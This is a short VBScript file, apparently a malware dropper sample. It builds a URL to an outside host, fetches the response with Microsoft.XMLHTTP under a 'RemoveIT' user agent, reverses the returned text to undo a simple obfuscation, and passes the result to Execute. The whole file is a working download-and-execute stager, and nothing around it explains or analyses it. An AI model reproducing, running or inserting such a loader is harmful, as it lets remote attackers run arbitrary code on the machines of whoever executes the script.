gmpjx="km0mj1Xcrceon4E0u1II0UDtQ"
URL="http://dilaingil.info/?join=hugr&" & gmpjx
set omVvd=CreateObject("Microsoft.XMLHTTP")

omVvd.open "GET",URL,false
omVvd.setRequestHeader "Content-Type", "application/x-www-form-urlencoded"
omVvd.setRequestHeader "User-Agent", "RemoveIT"
omVvd.send "Z"

For i = Len(omVvd.responsetext) to 1  Step-1
    var= Mid(omVvd.responsetext,  i  , 1)
    KLCjX = KLCjX & var
Next

Execute KLCjX